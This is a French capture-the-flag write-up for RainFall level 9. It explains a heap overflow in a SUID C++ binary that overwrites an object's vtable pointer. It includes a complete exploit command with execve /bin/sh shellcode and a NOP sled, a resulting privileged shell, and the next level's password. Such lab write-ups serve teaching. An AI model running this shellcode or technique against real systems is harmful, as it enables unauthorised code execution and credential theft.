# LEVEL9

Le système de fichier se présente de cette manière :

```bash
level9@RainFall:~$ ls -la

dr-xr-x---+ 1 level9 level9   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level9 level9  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level9 level9 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 bonus0 users  6720 Mar  6  2016 level9
-rw-r--r--+ 1 level9 level9   65 Sep 23  2015 .pass
-rw-r--r-- 1 level9 level9  675 Apr  3  2012 .profile
```

Le binaire `level9` possède le **SUID** et appartient à `bonus0`. Il s'exécute donc avec les privilèges de `bonus0`.

## Analyse

Le binaire est écrit en **C++** et utilise une classe `N`.

Deux objets sont créés dans le `main` :

```cpp
N *a = new N(5);
N *b = new N(6);
```

Chaque objet fait `0x6c` octets :

```asm
mov DWORD PTR [esp],0x6c
call _Znwj
```

Les allocations donnent :

```text
a -> 0x0804a008
b -> 0x0804a078
```

Le constructeur initialise la vtable et la valeur de l'objet :

```asm
mov [this], 0x08048848
mov [this + 0x68], value
```

La structure de l'objet est donc approximativement :

```text
+0x00  vtable
+0x04  annotation
...
+0x68  value
```

### `setAnnotation()`

Le programme appelle :

```cpp
a->setAnnotation(argv[1]);
```

La fonction fait :

```asm
strlen(argv[1])

memcpy(this + 4, argv[1], strlen(argv[1]))
```

Il n'y a **aucune vérification de taille** avant le `memcpy`.

L'annotation commence donc à :

```text
a + 0x04 = 0x0804a00c
```

et peut dépasser la taille de l'objet.

Cela permet d'écraser des données situées après `a`, notamment la vtable de `b`.

## Exploitation

La taille d'un objet est de `0x6c`, soit 108 octets.

Un test avec 109 caractères permet de provoquer un crash :

```bash
level9@RainFall:~$ ./level9 $(python2 -c 'print "A" * 109')
Segmentation fault (core dumped)
```

L'appel final du programme est particulièrement intéressant :

```asm
mov eax, [b]
mov edx, [eax]
...
call edx
```

Le programme récupère donc la **vtable de `b`**, prend sa première entrée et l'utilise comme adresse de fonction.

En débordant `a`, on peut remplacer cette vtable par une adresse contrôlée.

On place alors :

```text
0x0804a010
```

dans la vtable, afin que l'appel indirect récupère une adresse située dans notre payload.

Le reste du payload contient un shellcode précédé d'un NOP sled :

```text
shellcode : 34 octets
NOP       : 70 octets
adresse   : 0x0804a00c
```

Une première tentative avec :

```text
0x0804a010
```

comme adresse de vtable provoque :

```text
0x9958316a in ?? ()
```

Le retour n'arrive donc pas au bon endroit.

L'adresse est ensuite ajustée afin que l'appel indirect tombe sur le shellcode présent dans l'objet.

## Exploit

```bash
level9@RainFall:~$ ./level9 $(python2 -c 'import sys; sys.stdout.write("\x10\xa0\x04\x08" + "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80" + "\x90" * 70 + "\x0c\xa0\x04\x08")')
```

On obtient un shell avec les privilèges de `bonus0` :

```bash
$ id

uid=2010(bonus0) gid=2009(level9) egid=100(users) groups=2010(bonus0),100(users),2009(level9)
```

On peut ensuite récupérer le mot de passe :

```bash
$ cat /home/user/bonus0/.pass

f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```

